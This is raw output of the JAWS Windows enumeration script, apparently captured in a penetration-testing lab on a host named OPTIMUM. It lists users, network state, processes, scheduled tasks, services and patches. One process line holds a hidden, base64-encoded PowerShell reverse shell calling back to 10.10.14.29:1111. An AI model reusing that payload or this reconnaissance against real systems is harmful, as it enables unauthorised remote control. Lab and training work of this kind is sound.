
```


Running J.A.W.S. Enumeration
	- Gathering User Information
	- Gathering Processes, Services and Scheduled Tasks
	- Gathering Installed Software
	- Gathering File System Information
	- Looking for Simple Priv Esc Methods
############################################################
##     J.A.W.S. (Just Another Windows Enum Script)        ##
##                                                        ##
##           https://github.com/411Hall/JAWS              ##
##                                                        ##
############################################################

Windows Version: Microsoft Windows Server 2012 R2 Standard
Architecture: x86
Hostname: OPTIMUM
Current User: kostas
Current Time\Date: 06/25/2024 06:16:05

-----------------------------------------------------------
 Users
-----------------------------------------------------------
----------
Username: Administrator
Groups:   Administrators
----------
Username: Guest
Groups:   Guests
----------
Username: kostas
Groups:   Users

-----------------------------------------------------------
 Network Information
-----------------------------------------------------------

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 10.10.10.8
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2

Tunnel adapter isatap.{99C463C2-DC10-45A6-9CC8-E62F160519AE}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :

-----------------------------------------------------------
 Arp
-----------------------------------------------------------

Interface: 10.10.10.8 --- 0xc
  Internet Address      Physical Address      Type
  10.10.10.2            00-50-56-b9-6a-21     dynamic
  10.10.10.255          ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.252           01-00-5e-00-00-fc     static


-----------------------------------------------------------
 NetStat
-----------------------------------------------------------

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       2500
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       584
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       396
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       680
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       716
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       408
  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       488
  TCP    0.0.0.0:49157          0.0.0.0:0              LISTENING       496
  TCP    10.10.10.8:139         0.0.0.0:0              LISTENING       4
  TCP    10.10.10.8:49176       10.10.14.29:1111       ESTABLISHED     1300
  TCP    [::]:135               [::]:0                 LISTENING       584
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49152             [::]:0                 LISTENING       396
  TCP    [::]:49153             [::]:0                 LISTENING       680
  TCP    [::]:49154             [::]:0                 LISTENING       716
  TCP    [::]:49155             [::]:0                 LISTENING       408
  TCP    [::]:49156             [::]:0                 LISTENING       488
  TCP    [::]:49157             [::]:0                 LISTENING       496
  UDP    0.0.0.0:123            *:*                                    776
  UDP    0.0.0.0:5355           *:*                                    840
  UDP    10.10.10.8:137         *:*                                    4
  UDP    10.10.10.8:138         *:*                                    4
  UDP    [::]:123               *:*                                    776


-----------------------------------------------------------
 Firewall Status
-----------------------------------------------------------

Firwall is Enabled

-----------------------------------------------------------
 FireWall Rules
-----------------------------------------------------------

Name                                    LocalPorts                              ApplicationName
----                                    ----------                              ---------------
Core Networking - Packet Too Big (IC...
HFS                                     80
PING
Core Networking - Dynamic Host Confi... 68                                      C:\Windows\system32\svchost.exe
Core Networking - Dynamic Host Confi... 546                                     C:\Windows\system32\svchost.exe
Core Networking - Teredo (UDP-In)       Teredo                                  C:\Windows\system32\svchost.exe
Network Discovery (LLMNR-UDP-In)        5355                                    C:\Windows\system32\svchost.exe
Network Discovery (Pub-WSD-In)          3702                                    C:\Windows\system32\svchost.exe
Network Discovery (SSDP-In)             1900                                    C:\Windows\system32\svchost.exe
Network Discovery (WSD-In)              3702                                    C:\Windows\system32\svchost.exe
Core Networking - Destination Unreac...                                         System
Core Networking - Destination Unreac...                                         System
Core Networking - Internet Group Man...                                         System
Core Networking - IPHTTPS (TCP-In)      IPHTTPS                                 System
Core Networking - IPv6 (IPv6-In)                                                System
Core Networking - Multicast Listener...                                         System
Core Networking - Multicast Listener...                                         System
Core Networking - Multicast Listener...                                         System
Core Networking - Multicast Listener...                                         System
Core Networking - Neighbor Discovery...                                         System
Core Networking - Neighbor Discovery...                                         System
Core Networking - Parameter Problem ...                                         System
Core Networking - Router Advertiseme...                                         System
Core Networking - Router Solicitatio...                                         System
Core Networking - Time Exceeded (ICM...                                         System
Network Discovery (NB-Datagram-In)      138                                     System
Network Discovery (NB-Name-In)          137                                     System
Network Discovery (UPnP-In)             2869                                    System
Network Discovery (WSD Events-In)       5357                                    System
Network Discovery (WSD EventsSecure-In) 5358                                    System
Windows Remote Management (HTTP-In)     5985                                    System
Windows Remote Management (HTTP-In)     5985                                    System
Core Networking - Multicast Listener...
Core Networking - Multicast Listener...
Core Networking - Multicast Listener...
Core Networking - Multicast Listener...
Core Networking - Neighbor Discovery...
Core Networking - Neighbor Discovery...
Core Networking - Packet Too Big (IC...
Core Networking - Parameter Problem ...
Core Networking - Router Advertiseme...
Core Networking - Router Solicitatio...
Core Networking - Time Exceeded (ICM...
Core Networking - Group Policy (LSAS... *                                       C:\Windows\system32\lsass.exe
Core Networking - DNS (UDP-Out)         *                                       C:\Windows\system32\svchost.exe
Core Networking - Dynamic Host Confi... 68                                      C:\Windows\system32\svchost.exe
Core Networking - Dynamic Host Confi... 546                                     C:\Windows\system32\svchost.exe
Core Networking - Group Policy (TCP-... *                                       C:\Windows\system32\svchost.exe
Core Networking - IPHTTPS (TCP-Out)     *                                       C:\Windows\system32\svchost.exe
Core Networking - Teredo (UDP-Out)      *                                       C:\Windows\system32\svchost.exe
Network Discovery (LLMNR-UDP-Out)       *                                       C:\Windows\system32\svchost.exe
Network Discovery (Pub WSD-Out)         *                                       C:\Windows\system32\svchost.exe
Network Discovery (SSDP-Out)            *                                       C:\Windows\system32\svchost.exe
Network Discovery (UPnPHost-Out)        *                                       C:\Windows\system32\svchost.exe
Network Discovery (WSD-Out)             *                                       C:\Windows\system32\svchost.exe
Core Networking - Group Policy (NP-Out) *                                       System
Core Networking - Internet Group Man...                                         System
Core Networking - IPv6 (IPv6-Out)                                               System
Network Discovery (NB-Datagram-Out)     *                                       System
Network Discovery (NB-Name-Out)         *                                       System
Network Discovery (UPnP-Out)            *                                       System
Network Discovery (WSD Events-Out)      *                                       System
Network Discovery (WSD EventsSecure-... *                                       System


-----------------------------------------------------------
 Hosts File Content
-----------------------------------------------------------

# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost


-----------------------------------------------------------
 Processes
-----------------------------------------------------------

Name                    ProcessID Owner  CommandLine
----                    --------- -----  -----------
conhost.exe                  2744 kostas \??\C:\Windows\system32\conhost.exe 0x4
csrss.exe                     344
csrss.exe                     404
dllhost.exe                  1440
dwm.exe                       672
explorer.exe                 1292 kostas C:\Windows\Explorer.EXE
hfs.exe                      2500 kostas "C:\Users\kostas\Desktop\hfs.exe"
lsass.exe                     496
ManagementAgentHost.exe      1036
msdtc.exe                    1592
powershell.exe               1300 kostas "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ExecutionPolicy B
                                         ypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand J
                                         ABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGU
                                         AdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0A
                                         C4AMgA5ACIALAAxADEAMQAxACkAOwAgACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAA
                                         uAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7ACAAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAP
                                         QAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwAgAHcAaABpAGwAZQAoACgAJABpACAAPQAgACQ
                                         AcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAwACwAJABiAHkAdABlAHMALgBMA
                                         GUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAIAAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwA
                                         tAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQAL
                                         gBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQ
                                         AZQBzACwAMAAsACQAaQApADsAIAAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAEkAbgB2AG8AawBlA
                                         C0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQB
                                         TAHQAcgBpAG4AZwAgACkAOwAgACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAY
                                         QBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgARwBlAHQALQBMAG8AYwBhAHQAaQBvAG4AKQAuAFA
                                         AYQB0AGgAIAArACAAIgA+ACAAIgA7ACAAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4A
                                         HQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAA
                                         kAHMAZQBuAGQAYgBhAGMAawAyACkAOwAgACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZ
                                         QBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAgACQ
                                         AcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAgACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzA
                                         GUAKAApAA==
services.exe                  488
smss.exe                      236
spoolsv.exe                   408
svchost.exe                  1332
svchost.exe                   664
svchost.exe                   948
svchost.exe                   680
svchost.exe                   716
svchost.exe                   556
svchost.exe                   584
svchost.exe                   776
svchost.exe                   840
System                          4
System Idle Process             0
taskhostex.exe               1816 kostas taskhostex.exe
VGAuthService.exe             308
vmtoolsd.exe                 2376 kostas "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
vmtoolsd.exe                 1012
wininit.exe                   396
winlogon.exe                  432
WmiPrvSE.exe                 2044
WmiPrvSE.exe                 1652



-----------------------------------------------------------
 Scheduled Tasks
-----------------------------------------------------------
Current System Time: 06/25/2024 06:16:08

TaskName    : \Optimize Start Menu Cache Files-S-1-5-21-605891470-2991919448-81205106-1001
Run As User : kostas
Task To Run : COM handler

TaskName    : \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64 Critical
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 Critical
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Active Directory Rights Management Services Client\AD RMS Rights Policy Template Manag
              ement (Automated)
Run As User : Everyone
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Active Directory Rights Management Services Client\AD RMS Rights Policy Template Manag
              ement (Automated)
Run As User : Everyone
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Active Directory Rights Management Services Client\AD RMS Rights Policy Template Manag
              ement (Manual)
Run As User : Everyone
Task To Run : COM handler

TaskName    : \Microsoft\Windows\AppID\SmartScreenSpecific
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser
Run As User : SYSTEM
Task To Run : %windir%\system32\rundll32.exe aepdu.dll,AePduRunUpdate -nolegacy

TaskName    : \Microsoft\Windows\Application Experience\ProgramDataUpdater
Run As User : SYSTEM
Task To Run : %windir%\system32\rundll32.exe aepdu.dll,AePduRunUpdate

TaskName    : \Microsoft\Windows\Autochk\Proxy
Run As User : SYSTEM
Task To Run : %windir%\system32\rundll32.exe /d acproxy.dll,PerformAutochkOperations

TaskName    : \Microsoft\Windows\CertificateServicesClient\UserTask
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\CertificateServicesClient\UserTask
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\CertificateServicesClient\UserTask
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\CertificateServicesClient\UserTask-Roam
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\CertificateServicesClient\UserTask-Roam
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Chkdsk\ProactiveScan
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Customer Experience Improvement Program\Consolidator
Run As User : SYSTEM
Task To Run : %SystemRoot%\System32\wsqmcons.exe

TaskName    : \Microsoft\Windows\Customer Experience Improvement Program\KernelCeipTask
Run As User : LOCAL SERVICE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Customer Experience Improvement Program\UsbCeip
Run As User : Administrators
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Data Integrity Scan\Data Integrity Scan
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Data Integrity Scan\Data Integrity Scan
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Data Integrity Scan\Data Integrity Scan for Crash Recovery
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Defrag\ScheduledDefrag
Run As User : SYSTEM
Task To Run : %windir%\system32\defrag.exe -c -h -k -g -$

TaskName    : \Microsoft\Windows\Device Setup\Metadata Refresh
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\IME\SQM data sender
Run As User : LOCAL SERVICE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents
Run As User : Administrators
Task To Run : COM handler

TaskName    : \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents
Run As User : Administrators
Task To Run : COM handler

TaskName    : \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents
Run As User : Administrators
Task To Run : COM handler

TaskName    : \Microsoft\Windows\MemoryDiagnostic\ProcessMemoryDiagnosticEvents
Run As User : Administrators
Task To Run : COM handler

TaskName    : \Microsoft\Windows\MemoryDiagnostic\RunFullMemoryDiagnostic
Run As User : Administrators
Task To Run : COM handler

TaskName    : \Microsoft\Windows\MUI\LPRemove
Run As User : SYSTEM
Task To Run : %windir%\system32\lpremove.exe

TaskName    : \Microsoft\Windows\Multimedia\SystemSoundsService
Run As User : Users
Task To Run : COM handler

TaskName    : \Microsoft\Windows\NetCfg\BindingWorkItemQueueHandler
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\NetTrace\GatherNetworkInfo
Run As User : Users
Task To Run : %windir%\system32\gatherNetworkInfo.vbs

TaskName    : \Microsoft\Windows\Plug and Play\Device Install Reboot Required
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\RAC\RacTask
Run As User : LOCAL SERVICE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\RAC\RacTask
Run As User : LOCAL SERVICE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\RAC\RacTask
Run As User : LOCAL SERVICE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Registry\RegIdleBackup
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Server Manager\CleanupOldPerfLogs
Run As User : SYSTEM
Task To Run : %systemroot%\system32\cscript.exe /B /nologo %systemroot%\system32\calluxxprovider.vbs $(Arg0) $(Arg1) $(
              Arg2)

TaskName    : \Microsoft\Windows\Server Manager\ServerManager
Run As User : Administrators
Task To Run : %windir%\system32\ServerManagerLauncher.exe

TaskName    : \Microsoft\Windows\Servicing\StartComponentCleanup
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Shell\CreateObjectTask
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Software Inventory Logging\Collection
Run As User : SYSTEM
Task To Run : %systemroot%\system32\cmd.exe /d /c %systemroot%\system32\silcollector.cmd publish

TaskName    : \Microsoft\Windows\Software Inventory Logging\Configuration
Run As User : SYSTEM
Task To Run : %systemroot%\system32\cmd.exe /d /c %systemroot%\system32\silcollector.cmd configure

TaskName    : \Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTaskLogon
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Storage Tiers Management\Storage Tiers Management Initialization
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Storage Tiers Management\Storage Tiers Optimization
Run As User : SYSTEM
Task To Run : %windir%\system32\defrag.exe -c -h -g -#

TaskName    : \Microsoft\Windows\Task Manager\Interactive
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\TaskScheduler\Idle Maintenance
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\TaskScheduler\Manual Maintenance
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\TaskScheduler\Regular Maintenance
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\TextServicesFramework\MsCtfMonitor
Run As User : Users
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Time Synchronization\SynchronizeTime
Run As User : LOCAL SERVICE
Task To Run : %windir%\system32\sc.exe start w32time task_started

TaskName    : \Microsoft\Windows\Time Zone\SynchronizeTimeZone
Run As User : SYSTEM
Task To Run : %windir%\system32\tzsync.exe

TaskName    : \Microsoft\Windows\WDI\ResolutionHost
Run As User : INTERACTIVE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Windows Error Reporting\QueueReporting
Run As User : Users
Task To Run : %windir%\system32\wermgr.exe -queuereporting

TaskName    : \Microsoft\Windows\Windows Error Reporting\QueueReporting
Run As User : Users
Task To Run : %windir%\system32\wermgr.exe -queuereporting

TaskName    : \Microsoft\Windows\Windows Filtering Platform\BfeOnServiceStartTypeChange
Run As User : SYSTEM
Task To Run : %windir%\system32\rundll32.exe bfe.dll,BfeOnServiceStartTypeChange

TaskName    : \Microsoft\Windows\WindowsColorSystem\Calibration Loader
Run As User : Users
Task To Run : COM handler

TaskName    : \Microsoft\Windows\WindowsColorSystem\Calibration Loader
Run As User : Users
Task To Run : COM handler

TaskName    : \Microsoft\Windows\WindowsUpdate\AUFirmwareInstall
Run As User : LOCAL SERVICE
Task To Run : COM handler

TaskName    : \Microsoft\Windows\WindowsUpdate\AUScheduledInstall
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\WindowsUpdate\AUSessionConnect
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\WindowsUpdate\AUSessionConnect
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\WindowsUpdate\AUSessionConnect
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\WindowsUpdate\AUSessionConnect
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\WindowsUpdate\AUSessionConnect
Run As User : SYSTEM
Task To Run : COM handler

TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start
Run As User : SYSTEM
Task To Run : C:\Windows\system32\sc.exe start wuauserv

TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start
Run As User : SYSTEM
Task To Run : C:\Windows\system32\sc.exe start wuauserv

TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start
Run As User : SYSTEM
Task To Run : C:\Windows\system32\sc.exe start wuauserv

TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start
Run As User : SYSTEM
Task To Run : C:\Windows\system32\sc.exe start wuauserv

TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start With Network
Run As User : SYSTEM
Task To Run : C:\Windows\system32\sc.exe start wuauserv

TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start With Network
Run As User : SYSTEM
Task To Run : C:\Windows\system32\sc.exe start wuauserv

TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start With Network
Run As User : SYSTEM
Task To Run : C:\Windows\system32\sc.exe start wuauserv

TaskName    : \Microsoft\Windows\WindowsUpdate\Scheduled Start With Network
Run As User : SYSTEM
Task To Run : C:\Windows\system32\sc.exe start wuauserv

TaskName    : \Microsoft\Windows\Wininet\CacheTask
Run As User : Users
Task To Run : COM handler

TaskName    : \Microsoft\Windows\Workplace Join\Automatic-Workplace-Join
Run As User : Authenticated Users
Task To Run : %SystemRoot%\System32\AutoWorkplace.exe join

TaskName    : \Microsoft\Windows\WS\WSTask
Run As User : SYSTEM
Task To Run : COM handler




-----------------------------------------------------------
 Services
-----------------------------------------------------------

Name                         DisplayName                                             Status
----                         -----------                                             ------
smphost                      Microsoft Storage Spaces SMP                           Stopped
SNMPTRAP                     SNMP Trap                                              Stopped
sppsvc                       Software Protection                                    Stopped
seclogon                     Secondary Logon                                        Stopped
SessionEnv                   Remote Desktop Configuration                           Stopped
SharedAccess                 Internet Connection Sharing (ICS)                      Stopped
SSDPSRV                      SSDP Discovery                                         Stopped
SysMain                      Superfetch                                             Stopped
TapiSrv                      Telephony                                              Stopped
TermService                  Remote Desktop Services                                Stopped
SstpSvc                      Secure Socket Tunneling Protocol Service               Stopped
svsvc                        Spot Verifier                                          Stopped
swprv                        Microsoft Software Shadow Copy Provider                Stopped
SCPolicySvc                  Smart Card Removal Policy                              Stopped
PrintNotify                  Printer Extensions and Notifications                   Stopped
RasAuto                      Remote Access Auto Connection Manager                  Stopped
RasMan                       Remote Access Connection Manager                       Stopped
NetTcpPortSharing            Net.Tcp Port Sharing Service                           Stopped
PerfHost                     Performance Counter DLL Host                           Stopped
pla                          Performance Logs & Alerts                              Stopped
wudfsvc                      Windows Driver Foundation - User-mode Driver Framework Stopped
sacsvr                       Special Administration Console Helper                  Stopped
SCardSvr                     Smart Card                                             Stopped
ScDeviceEnum                 Smart Card Device Enumeration Service                  Stopped
RemoteRegistry               Remote Registry                                        Stopped
RpcLocator                   Remote Procedure Call (RPC) Locator                    Stopped
RSoPProv                     Resultant Set of Policy Provider                       Stopped
WcsPlugInService             Windows Color System                                   Stopped
WdiServiceHost               Diagnostic Service Host                                Stopped
WdiSystemHost                Diagnostic System Host                                 Stopped
vmvss                        VMware Snapshot Provider                               Stopped
VMwareCAFCommAmqpListener    VMware CAF AMQP Communication Service                  Stopped
VSS                          Volume Shadow Copy                                     Stopped
Wecsvc                       Windows Event Collector                                Stopped
wmiApSrv                     WMI Performance Adapter                                Stopped
WPDBusEnum                   Portable Device Enumerator Service                     Stopped
WSService                    Windows Store Service (WSService)                      Stopped
WEPHOSTSVC                   Windows Encryption Provider Host Service               Stopped
wercplsupport                Problem Reports and Solutions Control Panel Support    Stopped
WerSvc                       Windows Error Reporting Service                        Stopped
vmicvss                      Hyper-V Volume Shadow Copy Requestor                   Stopped
UI0Detect                    Interactive Services Detection                         Stopped
UmRdpService                 Remote Desktop Services UserMode Port Redirector       Stopped
upnphost                     UPnP Device Host                                       Stopped
THREADORDER                  Thread Ordering Server                                 Stopped
TieringEngineService         Storage Tiers Management                               Stopped
TrustedInstaller             Windows Modules Installer                              Stopped
vds                          Virtual Disk                                           Stopped
vmicrdv                      Hyper-V Remote Desktop Virtualization Service          Stopped
vmicshutdown                 Hyper-V Guest Shutdown Service                         Stopped
vmictimesync                 Hyper-V Time Synchronization Service                   Stopped
vmicguestinterface           Hyper-V Guest Service Interface                        Stopped
vmicheartbeat                Hyper-V Heartbeat Service                              Stopped
vmickvpexchange              Hyper-V Data Exchange Service                          Stopped
Netman                       Network Connections                                    Stopped
EFS                          Encrypting File System (EFS)                           Stopped
KtmRm                        KtmRm for Distributed Transaction Coordinator          Stopped
KeyIso                       CNG Key Isolation                                      Stopped
BITS                         Background Intelligent Transfer Service                Stopped
Eaphost                      Extensible Authentication Protocol                     Stopped
Audiosrv                     Windows Audio                                          Stopped
lltdsvc                      Link-Layer Topology Discovery Mapper                   Stopped
DeviceAssociationService     Device Association Service                             Stopped
DeviceInstall                Device Install Service                                 Stopped
CertPropSvc                  Certificate Propagation                                Stopped
hidserv                      Human Interface Device Service                         Stopped
fdPHost                      Function Discovery Provider Host                       Stopped
FDResPub                     Function Discovery Resource Publication                Stopped
hkmsvc                       Health Key and Certificate Management                  Stopped
IKEEXT                       IKE and AuthIP IPsec Keying Modules                    Stopped
defragsvc                    Optimize drives                                        Stopped
Browser                      Computer Browser                                       Stopped
IEEtwCollectorService        Internet Explorer ETW Collector Service                Stopped
AudioEndpointBuilder         Windows Audio Endpoint Builder                         Stopped
ALG                          Application Layer Gateway Service                      Stopped
napagent                     Network Access Protection Agent                        Stopped
dot3svc                      Wired AutoConfig                                       Stopped
AppIDSvc                     Application Identity                                   Stopped
Netlogon                     Netlogon                                               Stopped
KPSSVC                       KDC Proxy Server service (KPS)                         Stopped
NcaSvc                       Network Connectivity Assistant                         Stopped
RemoteAccess                 Routing and Remote Access                              Stopped
msiserver                    Windows Installer                                      Stopped
AppXSvc                      AppX Deployment Service (AppXSVC)                      Stopped
Appinfo                      Application Information                                Stopped
AppReadiness                 App Readiness                                          Stopped
AppMgmt                      Application Management                                 Stopped
MMCSS                        Multimedia Class Scheduler                             Stopped
MSiSCSI                      Microsoft iSCSI Initiator Service                      Stopped
VaultSvc                     Credential Manager                                     Running
Dhcp                         DHCP Client                                            Running
VGAuthService                VMware Alias Manager and Ticket Service                Running
DcomLaunch                   DCOM Server Process Launcher                           Running
CryptSvc                     Cryptographic Services                                 Running
COMSysApp                    COM+ System Application                                Running
WinHttpAutoProxySvc          WinHTTP Web Proxy Auto-Discovery Service               Running
BFE                          Base Filtering Engine                                  Running
Winmgmt                      Windows Management Instrumentation                     Running
wuauserv                     Windows Update                                         Running
WinRM                        Windows Remote Management (WS-Management)              Running
Wcmsvc                       Windows Connection Manager                             Running
BrokerInfrastructure         Background Tasks Infrastructure Service                Running
VMTools                      VMware Tools                                           Running
VMwareCAFManagementAgentHost VMware CAF Management Agent Service                    Running
W32Time                      Windows Time                                           Running
AeLookupSvc                  Application Experience                                 Running
LSM                          Local Session Manager                                  Running
RpcSs                        Remote Procedure Call (RPC)                            Running
MpsSvc                       Windows Firewall                                       Running
RpcEptMapper                 RPC Endpoint Mapper                                    Running
LanmanWorkstation            Workstation                                            Running
LanmanServer                 Server                                                 Running
lmhosts                      TCP/IP NetBIOS Helper                                  Running
SamSs                        Security Accounts Manager                              Running
nsi                          Network Store Interface Service                        Running
PlugPlay                     Plug and Play                                          Running
netprofm                     Network List Service                                   Running
NlaSvc                       Network Location Awareness                             Running
ProfSvc                      User Profile Service                                   Running
MSDTC                        Distributed Transaction Coordinator                    Running
PolicyAgent                  IPsec Policy Agent                                     Running
Power                        Power                                                  Running
Themes                       Themes                                                 Running
TrkWks                       Distributed Link Tracking Client                       Running
EventSystem                  COM+ Event System                                      Running
EventLog                     Windows Event Log                                      Running
DPS                          Diagnostic Policy Service                              Running
Dnscache                     DNS Client                                             Running
DsmSvc                       Device Setup Manager                                   Running
UALSVC                       User Access Logging Service                            Running
iphlpsvc                     IP Helper                                              Running
ShellHWDetection             Shell Hardware Detection                               Running
Schedule                     Task Scheduler                                         Running
SENS                         System Event Notification Service                      Running
FontCache                    Windows Font Cache Service                             Running
SystemEventsBroker           System Events Broker                                   Running
Spooler                      Print Spooler                                          Running
gpsvc                        Group Policy Client                                    Running




-----------------------------------------------------------
 Installed Programs
-----------------------------------------------------------

VMware Tools                                                   10.1.7.5541682 VMware Tools
Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161 9.0.30729.6161 Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161
Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161 9.0.30729.6161 Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161



-----------------------------------------------------------
 Installed Patches
-----------------------------------------------------------

HotFixID  InstalledOn
--------  -----------
KB2959936
KB2896496
KB2919355
KB2920189
KB2928120
KB2931358
KB2931366
KB2933826
KB2938772
KB2949621
KB2954879
KB2958262
KB2958263
KB2961072
KB2965500
KB2966407
